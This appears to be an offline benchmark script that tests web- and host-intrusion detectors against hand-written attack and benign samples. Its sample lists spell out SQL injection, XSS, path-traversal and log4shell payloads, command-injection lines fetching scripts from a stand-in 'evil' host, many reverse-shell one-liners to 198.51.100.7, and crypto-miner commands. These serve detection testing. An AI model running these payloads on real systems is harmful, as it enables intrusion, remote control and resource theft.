#!/usr/bin/env python3
"""Evaluation of the v13.20 guards with numbers you can quote.   python3 eval/eval_new_attacks.py     -> eval/results/new_attacks.csv + NEW_ATTACKS_RESULTS.md

WHAT THIS IS: an offline benchmark. Attack and benign samples are fed straight into the guards' own code (web_guard: log lines, host_guard: a fake /proc,
integrity: temp folders). It measures detection per attack class, false positives on benign samples, decision time and recovery. It is NOT a network
test: no packets, no real T/P. The sample sets are small and written by us, so read the numbers as "what the rules catch and miss", not as a
claim about the internet. Add your own samples to the lists below to widen it. Every miss is printed, not hidden.
"""
import csv, hashlib, os, shutil, sys, tempfile, time
HERE = os.path.dirname(os.path.abspath(__file__)); ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "detector"))
import web_guard as wg, host_guard as hg

OUT = os.path.join(HERE, "results"); os.makedirs(OUT, exist_ok=True)
rows = []      # (area, class, samples, caught, note)
misses = []

def line(ip, url, st=200, ua="Mozilla/5.0 (X11; Linux x86_64)", m="GET"):
    url = url.replace(" ", "%20")          # a real request line cannot contain a raw space (browsers and servers encode it)
    return '%s - - [21/Nov/2026:10:00:00 +0000] "%s %s HTTP/1.1" %d 512 "-" "%s"' % (ip, m, url, st, ua)

# ------------------------------------------------------------------ web: attack sessions (one attacker address sends all variants of one class)
WEB = {
 "SQL injection": ["/item?id=1 UNION SELECT user,pass FROM users", "/item?id=1%20union%20all%20select%201,2,3", "/item?id=1' OR '1'='1",
   "/login?u=admin'--", "/p?id=1;DROP TABLE users", "/p?id=1 AND SLEEP(5)", "/p?id=1 AND benchmark(1000000,md5(1))",
   "/p?id=(SELECT table_name FROM information_schema.tables)", "/p?id=1/**/UNION/**/SELECT/**/1", "/p?id=1 UnIoN SeLeCt 1",
   "/p?id=-1 UNION%0aSELECT 1", "/p?id=1%2527 OR 1=1", "/search?q=1' AND 1=1 --", "/p?id=1 AND 1=1", "/p?id=1 AND (SELECT 1 FROM users WHERE 1=1)"],
 "XSS": ["/s?q=<script>alert(1)</script>", "/s?q=%3Cscript%3Ealert(1)%3C/script%3E", "/s?q=<img src=x onerror=alert(1)>", "/s?q=<svg onload=alert(1)>",
   "/s?q=javascript:alert(1)", "/s?q=<iframe src=//evil>", "/s?q=<ScRiPt>alert(1)</sCrIpT>", "/s?q=\"><body onload=alert(1)>"],
 "Path traversal": ["/download?f=../../etc/passwd", "/download?f=..%2f..%2fetc%2fpasswd", "/download?f=....//....//etc/passwd", "/static/..\\..\\windows\\win.ini",
   "/download?f=/etc/shadow", "/download?f=%252e%252e%252fetc%252fpasswd", "/x?f=/proc/self/environ", "/download?f=..%c0%af..%c0%afetc/passwd"],
 "Command injection / log4shell": ["/ping?ip=1.1.1.1;cat /etc/hosts", "/ping?ip=1.1.1.1|bash", "/x?a=${jndi:ldap://evil/a}", "/x?a=$(id)", "/x?a=`whoami`",
   "/run?cmd=/bin/sh -c id", "/x?a=1;wget http://evil/s.sh", "/x?a=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D", "/x?a=${${lower:j}ndi:ldap://evil/a}", "/x?a=1&&curl evil|sh"],
 "Probes (sensitive files)": ["/.env", "/.git/config", "/backup.sql", "/.svn/entries", "/config.php.bak", "/shell.php", "/etc/passwd"],
 "Probes (admin tools)": ["/wp-login.php", "/xmlrpc.php", "/phpmyadmin/", "/actuator/env", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/cgi-bin/test.cgi", "/boaform/admin/formLogin"],
}
SCANNERS = ["sqlmap/1.7.2#stable", "Nikto/2.5.0", "Mozilla/5.00 (Nikto/2.1.6)", "Nmap Scripting Engine", "masscan/1.3", "gobuster/3.6", "WPScan v3.8", "Nuclei - Open-source project", "python-requests/2.31", "curl/8.4.0"]
SCANNER_REAL = SCANNERS[:8]       # the last two are normal tools: they MUST NOT be blocked (checked in the benign section)

def web_session(urls, status=200, ua="Mozilla/5.0 (X11; Linux x86_64)", base=1):
    clock = [1000.0]; blocked = []
    g = wg.WebGuard(lambda ip: None, blocked.append, lambda ip: None, now=lambda: clock[0], log=lambda m: None)
    hit_lines = 0; first_block = None
    for i, u in enumerate(urls):
        clock[0] += 0.5
        c = wg.classify(line("203.0.113.%d" % base, u, status, ua))
        if c and any(p >= 1 for _, p in c[3]): hit_lines += 1
        g.feed(line("203.0.113.%d" % base, u, status, ua))
        if blocked and first_block is None: first_block = i + 1
    return hit_lines, bool(blocked), first_block

for cls, urls in WEB.items():
    st = 404 if cls.startswith("Probes") else 200
    flagged = 0
    for u in urls:                                   # per request: does the rule see it at all?
        c = wg.classify(line("203.0.113.9", u, st))
        if c and any(p >= 1 for _, p in c[3]): flagged += 1
        else: misses.append("web  %-26s not flagged: %s" % (cls, u))
    hits, blocked, first = web_session(urls, st)
    rows.append(("web", cls, len(urls), flagged, "requests flagged; attacker %s%s" % ("BLOCKED" if blocked else "not blocked", " after %d request(s)" % first if first else "")))
# scanner user agents
fl = 0
for ua in SCANNER_REAL:
    c = wg.classify(line("203.0.113.8", "/", 200, ua))
    if c and any(n == "scanner" for n, _ in c[3]): fl += 1
    else: misses.append("web  scanner UA not flagged: " + ua)
rows.append(("web", "Scanner tools (user agent)", len(SCANNER_REAL), fl, "blocked on the first request"))
# flood and 404 scanning (behaviour, not signatures)
clock = [1000.0]; bl = []
g = wg.WebGuard(lambda ip: None, bl.append, lambda ip: None, now=lambda: clock[0], log=lambda m: None); n = 0
for i in range(400):
    clock[0] += 0.02; g.feed(line("203.0.113.20", "/", 200)); n += 1
    if bl: break
rows.append(("web", "HTTP flood (50 req/s)", 1, 1 if bl else 0, "blocked after %d requests (%.1f s)" % (n, n * 0.02) if bl else "NOT blocked"))
clock = [1000.0]; bl = []; g = wg.WebGuard(lambda ip: None, bl.append, lambda ip: None, now=lambda: clock[0], log=lambda m: None); n = 0
for i in range(60):
    clock[0] += 1.0; g.feed(line("203.0.113.21", "/a%d" % i, 404)); n += 1
    if bl: break
rows.append(("web", "404 scanning (1 req/s)", 1, 1 if bl else 0, "blocked after %d requests" % n if bl else "NOT blocked (too slow for the 60 s window)"))
# ------------------------------------------------------------------ web: benign
BENIGN = ["/", "/index.html", "/about", "/products?page=%d" % 1, "/products?category=shoes&sort=price", "/search?q=select a color", "/search?q=union station timetable",
 "/search?q=drop shipping from china", "/search?q=how to join a table", "/blog/2026/11/how-to-use-sql-select-from-where", "/static/app.js", "/static/style.css", "/img/logo.png",
 "/api/v1/users/42", "/api/v1/items?limit=20&offset=40", "/docs/getting-started", "/contact", "/login", "/cart", "/checkout?step=2", "/favicon.ico", "/robots.txt",
 "/files/report-2026.pdf", "/search?q=cats+and+dogs", "/search?q=O'Brien", "/p?id=105", "/p?name=rock+and+roll", "/news?from=2026-01-01&to=2026-11-01", "/js/jquery.min.js?v=3.7",
 "/search?q=1=1", "/search?q=terms and conditions", "/api/search?q=%E0%A4%AD%E0%A4%BE%E0%A4%B0%E0%A4%A4", "/download/manual.pdf", "/user/profile?tab=settings", "/hello?name=world",
 "/search?q=script+writing+tips", "/search?q=shell+company+registration", "/wiki/Select_(SQL)", "/search?q=--help"]
AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)", "curl/8.4.0", "python-requests/2.31", "Googlebot/2.1"]
fp_urls = 0; fp_ips = 0
for k, u in enumerate(BENIGN):
    c = wg.classify(line("198.51.100.1", u, 200, AGENTS[k % 5]))
    if c and any(p >= 1 for _, p in c[3]): fp_urls += 1; misses.append("web  BENIGN flagged (false positive): " + u)
clock = [1000.0]; bl = []; g = wg.WebGuard(lambda ip: None, bl.append, lambda ip: None, now=lambda: clock[0], log=lambda m: None)
for r in range(4):                                       # 40 normal visitors, each browses the whole benign list
    pass
for v in range(40):
    for k, u in enumerate(BENIGN):
        clock[0] += 0.7; g.feed(line("198.51.100.%d" % (v + 10), u, 200, AGENTS[(k + v) % 5]))
fp_ips = len(bl)
rows.append(("web", "BENIGN requests", len(BENIGN), fp_urls, "requests wrongly flagged (lower is better)"))
rows.append(("web", "BENIGN visitors (40 visitors x %d pages)" % len(BENIGN), 40, fp_ips, "visitors wrongly BLOCKED (lower is better)"))
# a real admin using a login page that exists (status 200)
clock = [1000.0]; bl = []; g = wg.WebGuard(lambda ip: None, bl.append, lambda ip: None, now=lambda: clock[0], log=lambda m: None)
for i in range(6): clock[0] += 3; g.feed(line("198.51.100.99", "/wp-login.php", 200, m="POST"))
rows.append(("web", "BENIGN admin logging in to an existing /wp-login.php 6x", 1, 1 if bl else 0, "admin wrongly BLOCKED (lower is better)"))
# ------------------------------------------------------------------ web: speed
big = [line("203.0.113.%d" % (i % 200 + 1), BENIGN[i % len(BENIGN)] if i % 7 else WEB["SQL injection"][i % 15], 200) for i in range(20000)]
clock = [1000.0]; g = wg.WebGuard(lambda ip: None, lambda ip: None, lambda ip: None, now=lambda: clock[0], log=lambda m: None)
t0 = time.perf_counter()
for l in big: clock[0] += 0.001; g.feed(l)
dt = time.perf_counter() - t0
rows.append(("web", "Speed", 20000, 20000, "%.0f log lines per second, %.1f microseconds per line" % (20000 / dt, dt / 20000 * 1e6)))
# ------------------------------------------------------------------ web: retrieve (integrity)
R = tempfile.mkdtemp(); web = os.path.join(R, "www"); os.makedirs(web + "/img")
files = {"index.html": b"<h1>clean</h1>" * 50, "app.js": os.urandom(20000), "img/a.png": os.urandom(200000), "img/b.png": os.urandom(1500000), "style.css": b"body{}" * 500}
for k, v in files.items(): open(os.path.join(web, k), "wb").write(v)
snap = os.path.join(R, "snap"); wg.snapshot(web, snap); ig = wg.Integrity(web, snap, os.path.join(R, "q"), lambda o: None, log=lambda m: None, now=lambda: 5)
for k in files:                                          # deface: overwrite / truncate / delete, across the files
    p = os.path.join(web, k); mode = list(files).index(k) % 3
    if mode == 0: open(p, "wb").write(b"HACKED")
    elif mode == 1: open(p, "wb").write(b"")
    else: os.remove(p)
t0 = time.perf_counter(); o = ig.check(); dt = time.perf_counter() - t0
ok = sum(1 for k, v in files.items() if open(os.path.join(web, k), "rb").read() == v)
rows.append(("retrieve", "Defaced / emptied / deleted files restored (bit for bit)", len(files), ok, "%d bytes restored in %.1f ms" % (sum(len(v) for v in files.values()), dt * 1000)))
shells = ["shell.php", "x.phtml", "c99.php5", "cmd.jsp", "up.aspx", "t.cgi", "r.pl", "b.py", "x.sh", "w.war", "a.phar", "m.exe"]
for s in shells: open(os.path.join(web, "uploads_" + s), "w").write("x")
os.makedirs(web + "/uploads", exist_ok=True)
for s in shells: shutil.move(os.path.join(web, "uploads_" + s), os.path.join(web, "uploads", s))
benign_new = ["news.html", "logo2.png", "notes.txt", "data.json"]
for s in benign_new: open(os.path.join(web, s), "w").write("ok")
o = ig.check()
rows.append(("retrieve", "New script files (12 types) quarantined", len(shells), len(o["quarantined"]), "web shells moved out, mode 000"))
rows.append(("retrieve", "New harmless files left untouched", len(benign_new), sum(1 for s in benign_new if os.path.exists(os.path.join(web, s)) and s in o["new"]), "not quarantined, only noted"))
# ------------------------------------------------------------------ host: fake /proc
def fake_proc(cmds, sockets=None):
    R = tempfile.mkdtemp(); proc = os.path.join(R, "proc"); os.makedirs(proc + "/net"); tcp = ["  sl local rem st x x x x x x inode"]
    for i, (cmd, exe) in enumerate(cmds):
        pid = 1000 + i; d = "%s/%d" % (proc, pid); os.makedirs(d + "/fd")
        open(d + "/cmdline", "w").write("\0".join(cmd.split(" ")) + "\0"); open(d + "/stat", "w").write("%d (x) S 1 1 1" % pid); os.symlink(exe, d + "/exe")
        if sockets and sockets.get(i):
            os.symlink("socket:[%d]" % (5000 + i), d + "/fd/3"); tcp.append("   %d: 0100007F:1234 076433C6:115C 01 0 0 0 0 0 %d" % (i, 5000 + i))
    open(proc + "/net/tcp", "w").write("\n".join(tcp) + "\n"); return proc
def run_host(cmds, sockets=None):
    proc = fake_proc(cmds, sockets); acts = []
    g = hg.HostGuard(lambda p: acts.append(p), lambda e, r: None, lambda ip: None, lambda ip: None, lambda ip: None, proc=proc, me=1, log=lambda m: None)
    t0 = time.perf_counter(); found = g.scan(); dt = time.perf_counter() - t0
    return {f["pid"] - 1000 for f in found if f["level"] == "HIGH"}, dt
SH = ("/usr/bin/bash", 1)
RS = [("bash -c bash -i >& /dev/tcp/198.51.100.7/4444 0>&1", "/usr/bin/bash"), ("sh -i >& /dev/udp/198.51.100.7/53 0>&1", "/usr/bin/sh"), ("nc -e /bin/sh 198.51.100.7 4444", "/usr/bin/nc"),
 ("ncat 198.51.100.7 4444 -e /bin/bash", "/usr/bin/ncat"), ("cat /tmp/f|/bin/sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f mkfifo /tmp/f", "/usr/bin/bash"),
 ("socat TCP:198.51.100.7:4444 EXEC:/bin/sh", "/usr/bin/socat"), ("python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('198.51.100.7',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])", "/usr/bin/python3"),
 ("perl -e use Socket;socket(S,PF_INET,SOCK_STREAM,6);exec('/bin/sh -i')", "/usr/bin/perl"), ("php -r $sock=fsockopen('198.51.100.7',4444);exec('/bin/sh -i <&3 >&3 2>&3');", "/usr/bin/php"),
 ("ruby -rsocket -e c=TCPSocket.new('198.51.100.7','4444');exec('/bin/sh')", "/usr/bin/ruby"), ("openssl s_client -quiet -connect 198.51.100.7:4444|/bin/sh|openssl s_client -quiet -connect 198.51.100.7:4445", "/usr/bin/openssl"),
 ("awk BEGIN{s=\"/inet/tcp/0/198.51.100.7/4444\";while(1){s|&getline}}", "/usr/bin/gawk"), ("telnet 198.51.100.7 4444 | /bin/bash | telnet 198.51.100.7 4445", "/usr/bin/telnet"),
 ("node -e require('child_process').spawn('/bin/sh',[]);net.connect(4444,'198.51.100.7')", "/usr/bin/node"), ("bash -i", "/usr/bin/bash")]
found, dt = run_host(RS, {i: True for i in range(len(RS))})
for i in range(len(RS)):
    if i not in found: misses.append("host reverse shell not caught: " + RS[i][0][:90])
rows.append(("host", "Reverse shells (15 techniques, with a remote connection)", len(RS), len(found), "killed; remote address found from the socket"))
MI = [("xmrig -o pool.minexmr.com:4444 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRJ", "/tmp/xmrig"), ("./kdevtmpfsi", "/tmp/kdevtmpfsi"), ("/tmp/.x/minerd -a cryptonight -o stratum+tcp://pool:3333", "/tmp/.x/minerd"),
 ("cpuminer-multi -a scrypt -o stratum+tcp://x:3333", "/usr/local/bin/cpuminer-multi"), ("./kworker --url stratum+tcp://pool:3333 -u w", "/tmp/kworker"), ("./sshd2 -o pool.supportxmr.com:3333 -u 49abcdefghijklmnopqrstuvwxyz", "/tmp/sshd2"),
 ("java -jar app.jar --donate-level 1", "/usr/bin/java"), ("./kinsing", "/tmp/kinsing"), ("./sysupdate -o gulf.moneroocean.stream:10128 -u x", "/var/tmp/sysupdate")]
found, dt = run_host(MI)
for i in range(len(MI)):
    if i not in found: misses.append("host miner not caught: " + MI[i][0][:90])
rows.append(("host", "Crypto miners (9 variants incl. renamed)", len(MI), len(found), "killed"))
BEN = [("/usr/sbin/sshd -D", "/usr/sbin/sshd"), ("nginx: worker process", "/usr/sbin/nginx"), ("python3 manage.py runserver 0.0.0.0:8000", "/usr/bin/python3"), ("node server.js", "/usr/bin/node"),
 ("java -jar /opt/app/app.jar", "/usr/bin/java"), ("bash /opt/scripts/backup.sh", "/usr/bin/bash"), ("bash -c ls -la /var/log", "/usr/bin/bash"), ("sh -c echo hello", "/usr/bin/sh"), ("vim /etc/xmrig.conf", "/usr/bin/vim"),
 ("grep -r xmrig /var/log", "/usr/bin/grep"), ("man xmrig", "/usr/bin/man"), ("docker run -it ubuntu bash", "/usr/bin/docker"), ("tmux new -s work", "/usr/bin/tmux"), ("htop", "/usr/bin/htop"),
 ("/lib/systemd/systemd-journald", "/lib/systemd/systemd-journald"), ("cron -f", "/usr/sbin/cron"), ("postgres: checkpointer", "/usr/lib/postgresql/16/bin/postgres"), ("mysqld", "/usr/sbin/mysqld"),
 ("python3 -c print(1)", "/usr/bin/python3"), ("python3 -m http.server 8000", "/usr/bin/python3"), ("perl -e print(1)", "/usr/bin/perl"), ("ruby script.rb", "/usr/bin/ruby"), ("nc -l 8080", "/usr/bin/nc"),
 ("ncat -lvp 4444", "/usr/bin/ncat"), ("socat TCP-LISTEN:80,fork TCP:127.0.0.1:8080", "/usr/bin/socat"), ("python3 -c import socket;print(socket.gethostname())", "/usr/bin/python3"),
 ("ssh -t admin@host bash -i", "/usr/bin/ssh"), ("ssh admin@host", "/usr/bin/ssh"), ("curl -o /tmp/pkg.tgz https://example.org/xmrig-6.tar.gz", "/usr/bin/curl"), ("apt install -y nginx", "/usr/bin/apt"),
 ("git clone https://github.com/x/y", "/usr/bin/git"), ("rsync -a /data /backup", "/usr/bin/rsync"), ("php-fpm: pool www", "/usr/sbin/php-fpm8.2"), ("redis-server *:6379", "/usr/bin/redis-server"),
 ("code --no-sandbox", "/usr/share/code/code"), ("firefox", "/usr/lib/firefox/firefox"), ("tail -f /var/log/nginx/access.log", "/usr/bin/tail"), ("less /var/log/syslog", "/usr/bin/less"),
 ("bash", "/usr/bin/bash"), ("-bash", "/usr/bin/bash")]
found, dt = run_host(BEN, {26: True, 27: True})        # the ssh sessions have a real remote connection
for i in found: misses.append("host BENIGN killed (false positive): " + BEN[i][0])
rows.append(("host", "BENIGN processes (%d incl. ssh sessions, grep/man of 'xmrig', nc -l)" % len(BEN), len(BEN), len(found), "wrongly killed (lower is better)"))
many = [(c, e) for c, e in BEN] * 25
t0 = time.perf_counter(); run_host(many); dt = time.perf_counter() - t0
rows.append(("host", "Speed (one full scan of %d processes)" % len(many), len(many), len(many), "%.0f ms per scan (includes building the fake /proc)" % (dt * 1000)))


# ------------------------------------------------------------------ HELD-OUT samples: written AFTER the rules were tuned on the lists above, never used to tune
HOLD_WEB = {
 "SQL injection": ["/products?cat=1 UNION ALL SELECT NULL,NULL--", "/u?name=x' OR 'a'='a", "/u?id=1 AND 1=2 UNION SELECT 1,2", "/a?i=1;SELECT pg_sleep(5)", "/a?i=1' WAITFOR DELAY '0:0:5'--",
   "/a?i=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))", "/a?i=1 OR 1=1", "/a?i=0x31 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64", "/a?id=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)", "/a?q=%27%20OR%20%271%27=%271"],
 "XSS": ["/c?m=<script src=//evil/x.js></script>", "/c?m=<img src=1 onerror=prompt(1)>", "/c?m=<body onfocus=alert(1) autofocus>", "/c?m=<a href=javascript:alert(1)>x</a>", "/c?m=%3Csvg%2Fonload%3Dalert(1)%3E", "/c?m=<details open ontoggle=alert(1)>"],
 "Path traversal": ["/get?file=../../../../var/log/auth.log", "/get?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/get?f=..\\..\\boot.ini", "/get?f=....//....//....//etc/shadow", "/get?f=/proc/self/cmdline", "/a/..%2f..%2f..%2fetc/hosts"],
 "Command injection / log4shell": ["/p?h=a;nc 10.0.0.1 4444 -e /bin/sh", "/p?h=a|bash -i", "/p?q=${jndi:rmi://x/a}", "/p?h=$(curl evil|sh)", "/p?h=a%0acat%20/etc/passwd", "/p?h=;powershell -enc AAAA"],
}
hold_rows = []
for cls, urls in HOLD_WEB.items():
    fl = 0
    for u in urls:
        c = wg.classify(line("203.0.113.9", u, 200))
        if c and any(p >= 1 for _, p in c[3]): fl += 1
        else: misses.append("HELD-OUT web %-24s not flagged: %s" % (cls, u))
    hold_rows.append(("held-out web", cls, len(urls), fl, "requests flagged (samples not used for tuning)"))
HOLD_BEN = ["/search?q=how+to+select+a+laptop+from+the+store", "/blog/union-of-india-budget-2026", "/p?name=drop+zone+tickets", "/search?q=onclick+event+explained", "/docs/or-operator", "/news?id=12&and=1",
  "/search?q=javascript+tutorial", "/wiki/Cross-site_scripting", "/shop?color=red&size=m&sort=asc", "/maps?q=40.7,-74.0", "/p?redirect=/home", "/img/a..b.png", "/download/v1..v2.diff", "/user/o'connor", "/search?q=c%2B%2B+jobs"]
fp = sum(1 for u in HOLD_BEN if (wg.classify(line("198.51.100.5", u)) or (0, 0, 0, []))[3] and any(p >= 1 for _, p in wg.classify(line("198.51.100.5", u))[3]))
for u in HOLD_BEN:
    c = wg.classify(line("198.51.100.5", u))
    if c and any(p >= 1 for _, p in c[3]): misses.append("HELD-OUT web BENIGN flagged: " + u)
hold_rows.append(("held-out web", "BENIGN requests", len(HOLD_BEN), fp, "wrongly flagged (lower is better)"))
HRS = [("sh -c exec 3<>/dev/tcp/198.51.100.7/80;cat <&3", "/usr/bin/sh"), ("ncat --exec /bin/sh 198.51.100.7 9001", "/usr/bin/ncat"), ("python -c import pty,socket;s=socket.socket();s.connect(('198.51.100.7',1));pty.spawn('/bin/bash')", "/usr/bin/python"),
 ("ruby -e require 'socket';exec sprintf('/bin/sh -i <&%d',TCPSocket.open('198.51.100.7',1).fileno)", "/usr/bin/ruby"), ("php -r $s=fsockopen('198.51.100.7',1);proc_open('/bin/sh',[$s,$s,$s],$p);", "/usr/bin/php"),
 ("busybox nc 198.51.100.7 1 -e /bin/sh", "/bin/busybox"), ("bash -i", "/usr/bin/bash"), ("zsh -c zmodload zsh/net/tcp;ztcp 198.51.100.7 1;exec zsh -i <&$REPLY", "/usr/bin/zsh")]
found, _ = run_host(HRS, {i: True for i in range(len(HRS))})
for i in range(len(HRS)):
    if i not in found: misses.append("HELD-OUT host reverse shell not caught: " + HRS[i][0][:90])
hold_rows.append(("held-out host", "Reverse shells", len(HRS), len(found), "killed"))
HMI = [("./ld-linux-update -o pool.hashvault.pro:80 -u x", "/tmp/ld-linux-update"), ("./.cache/sysd --algo rx/0 --url stratum+ssl://x:443", "/home/u/.cache/sysd"), ("/usr/bin/xmrig-notls -o x:3333", "/usr/bin/xmrig-notls"), ("./javad", "/tmp/javad")]
found, _ = run_host(HMI)
for i in range(len(HMI)):
    if i not in found: misses.append("HELD-OUT host miner not caught: " + HMI[i][0][:90])
hold_rows.append(("held-out host", "Crypto miners", len(HMI), len(found), "killed"))
HBEN = [("python3 -m venv .venv", "/usr/bin/python3"), ("npm run dev", "/usr/bin/npm"), ("bash ./configure --prefix=/usr", "/usr/bin/bash"), ("sh -c cd /app && ./run.sh", "/usr/bin/sh"), ("openssl s_client -connect example.org:443", "/usr/bin/openssl"),
 ("telnet localhost 25", "/usr/bin/telnet"), ("nc -zv 10.0.0.5 22", "/usr/bin/nc"), ("socat - TCP:example.org:80", "/usr/bin/socat"), ("python3 -c import socket,sys;print(socket.getfqdn())", "/usr/bin/python3"),
 ("php artisan serve", "/usr/bin/php"), ("ruby -rsocket -e puts Socket.gethostname", "/usr/bin/ruby"), ("node -e console.log(require('os').hostname())", "/usr/bin/node"), ("zsh", "/usr/bin/zsh"), ("less xmrig.log", "/usr/bin/less"),
 ("docker exec -it web bash -i", "/usr/bin/docker"), ("sudo -i", "/usr/bin/sudo")]
found, _ = run_host(HBEN, {14: True})
for i in found: misses.append("HELD-OUT host BENIGN killed: " + HBEN[i][0])
hold_rows.append(("held-out host", "BENIGN processes", len(HBEN), len(found), "wrongly killed (lower is better)"))
rows += hold_rows

# ------------------------------------------------------------------ write
with open(os.path.join(OUT, "new_attacks.csv"), "w", newline="") as f:
    w = csv.writer(f); w.writerow(["area", "class", "samples", "caught_or_count", "note"]); w.writerows(rows)
md = ["# Evaluation of the v13.20 guards (offline benchmark)", "", "Made by `python3 eval/eval_new_attacks.py` on %s. Small hand-written sample sets, no network traffic: read it as what the rules catch and miss." % time.strftime("%F"), "",
      "**Read this first.** The rows without 'held-out' are the *development* samples: the rules were tuned until they passed, so those numbers are optimistic. The rows marked **held-out** were written after tuning and never used to tune: they are the honest estimate. A WEAK rule (a select...from sentence, 4 points) can flag a normal search but it never blocks on its own (block needs 10 points in 60 s).", "",
      "| Area | Class | Samples | Caught / count | Note |", "|---|---|---|---|---|"]
for a, c, n, k, note in rows:
    pct = "" if (a == "web" and ("Speed" in c)) else ""
    md.append("| %s | %s | %d | %d%s | %s |" % (a, c, n, k, " (%d%%)" % round(100 * k / n) if n > 1 and "Speed" not in c and "BENIGN" not in c else "", note))
md += ["", "## Misses and false positives (printed, not hidden)", ""] + ["- " + m for m in misses] if misses else ["", "No misses."]
open(os.path.join(OUT, "NEW_ATTACKS_RESULTS.md"), "w").write("\n".join(md) + "\n")
print("\n".join(md)); print("\nwritten:", OUT)
